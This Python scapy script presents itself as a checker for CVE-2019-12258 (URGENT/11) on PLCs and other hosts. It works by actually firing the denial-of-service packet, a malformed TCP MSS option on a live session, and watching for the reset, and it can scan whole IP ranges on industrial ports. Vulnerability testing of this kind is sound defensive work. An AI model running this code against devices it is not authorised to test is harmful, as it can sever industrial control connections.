from scapy.all import *
from netaddr import *
import socket
import sys
import argparse
import netifaces
import os

BUF_SIZE = 1024
TCP_RST_FLAG = 4

VERBOSE_NONE = 0
VERBOSE_NORMAL = 1
VERBOSE_HIGH = 2

DEFAULT_PORTS = [80, 443, 502, 44818]

ERR_ASSET_VULNERABLE = 1
ERR_CON_REFUSED = 2
ERR_CON_TIMED_OUT = 3

"""
This script is used to check whether a machine is vulnerable to CVE-2019-12258, one of the urgent11 vulnerabilities
published in August 2019 (https://nvd.nist.gov/vuln/detail/CVE-2019-12258).
CVE-2019-12258 is a relatively simple vulnerability, which allows DoS attacks on an existing tcp session without
prior knowledge of the session sequence numbers.
The check implemented here works as follows:
1. a tcp session is established using the given port
2. a packet with malformed TCP options is sent, with the same 4-tuple
3. the script checks whether an RST packet was sent by the server- which shows the attack worked
"""


#  converting windows GUID to interface name
def convert_windows_guid_to_interface(guid):
	for interface in get_windows_if_list():
		if interface['guid'] == guid:
			return interface['name']
	return None


# get interface name for the given socket
def get_iface(sock):
	source_ip = sock.getsockname()[0]
	for inter in netifaces.interfaces():
		inet = netifaces.ifaddresses(inter).get(netifaces.AF_INET, [])
		if any(a['addr'] == source_ip for a in inet):
			if os.name == 'nt':  # inter is a guid- we need to convert it to an actual name
				return convert_windows_guid_to_interface(inter)
			return inter
	return None


class CveTester(object):
	def __init__(self, ip, ports, verbose=VERBOSE_NORMAL, ip_end=None):
		self.verbose = verbose
		self.ip = ip
		self.tcp_ports = ports
		self.ip_end = ip_end

	# initiate a TCP socket
	def open_socket(self, dst_ip, dst_port):
		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		s.settimeout(3)
		try:
			s.connect((dst_ip, dst_port))
		except socket.timeout:
			if self.verbose > VERBOSE_NORMAL:
				print('Log: Unable to establish a connection to host {} port {}'.format(dst_ip, dst_port))
			return ERR_CON_TIMED_OUT
		except ConnectionRefusedError:
			if self.verbose >= VERBOSE_NORMAL:
				print("Log: The host {} has actively refused a connection to port {}".format(dst_ip, dst_port))
			return ERR_CON_REFUSED
		return s

	# try to execute DoS using CVE-12258
	def try_dos(self, sock, interface):
		src_ip, src_port = sock.getsockname()
		dst_ip, dst_port = sock.getpeername()
		tcp_pkt = (Ether() / IP(dst=dst_ip, src=src_ip) / TCP(dport=dst_port, sport=src_port))
		tcp_pkt['TCP'].options = [('MSS', '\x00')]
		if self.verbose == VERBOSE_HIGH:
			return srp(tcp_pkt, iface=interface, timeout=2)
		return srp(tcp_pkt, iface=interface, timeout=2, verbose=0)

	def is_ip_vulnerable(self, ip, tcp_port, interface=None):
		s = self.open_socket(ip, tcp_port)
		if s in [ERR_CON_REFUSED, ERR_CON_TIMED_OUT]:
			return s

		if not interface:
			interface = get_iface(s)
			if not interface:  # failed to get an interface
				print('Error: Failed to get the correct interface for the host {}'.format(ip))
				return False

		out = self.try_dos(s, interface)
		try:
			answers = out[0]  # get the answers
			res = answers[0]  # results list from the answers
			res_packet = res[1]  # the packet we want to check
			tcp = res_packet[TCP]  # tcp layer
			if tcp.flags & TCP_RST_FLAG == TCP_RST_FLAG:  # check whether TCP RST flag is on
				return True
		except (IndexError, TypeError):  # returned packet is not what we expected
			pass
		s.close()
		return False

	def is_ip_vulnerable_wrapper(self, ip, interface):
		if self.verbose >= VERBOSE_NORMAL:
			print('Checking ip {}...'.format(ip))
		asset_found = False
		for tcp_port in self.tcp_ports:
			retval = self.is_ip_vulnerable(ip, tcp_port, interface)
			if retval == ERR_ASSET_VULNERABLE:
				print('The host {} is vulnerable to  CVE-2019-12258'.format(ip))
				return
			elif retval != ERR_CON_TIMED_OUT:
				asset_found = True
		if self.verbose > VERBOSE_NONE and asset_found:
			print('The host {} is not vulnerable to  CVE-2019-12258'.format(ip))
		elif self.verbose > VERBOSE_NONE:
			print('Could not establish a connection to the host {}'.format(ip))

	def is_ip_vulnerable_ip_range(self, interface):
		for ip in iter_iprange(self.ip, self.ip_end):
			self.is_ip_vulnerable_wrapper(str(ip), interface)

	def test_for_cve(self, interface):
		if self.ip_end:
			self.is_ip_vulnerable_ip_range(interface)
		else:
			self.is_ip_vulnerable_wrapper(self.ip, interface)


def main():
	if sys.version_info[0] < 3:
		raise Exception("Python 3 or a more recent version is required.")
	parser = argparse.ArgumentParser(description="Script for testing whether PLCs are vulnerable to  CVE-2019-12258")
	parser.add_argument('-ip', '--ip', help='IP to test, or start of ip range', required=True)
	port_group = parser.add_mutually_exclusive_group(required=True)
	port_group.add_argument('-p', '--port', help='port to use.', type=int)
	port_group.add_argument('-d', '--default_ports', help='check all the default ports:  {}'.format(', '.join([str(port) for port in DEFAULT_PORTS])), action='store_true')
	parser.add_argument('-end_ip', '--end_ip', help='end of the ip range to test', required=False)
	parser.add_argument('-i', '--iface', help='name of the network interface to use', required=False)
	parser.add_argument('-v', '--verbose', type=int, help='verbose level: 0 to print only vulnerable devices,'
														  ' 1 to also print connection status, 2 to print scapy'
														  ' messages as well. default is 0', required=False,
						default=VERBOSE_NORMAL)
	arguments = parser.parse_args()
	ip = arguments.ip
	tcp_port = arguments.port
	use_default = arguments.default_ports
	if use_default:
		tcp_ports = DEFAULT_PORTS
	else:
		tcp_ports = [tcp_port]
	interface = arguments.iface
	end_ip = arguments.end_ip
	verbose = arguments.verbose
	if verbose is None:
		verbose = 1
	cve_tester = CveTester(ip, tcp_ports, verbose=verbose, ip_end=end_ip)
	cve_tester.test_for_cve(interface)


if __name__ == "__main__":
	main()
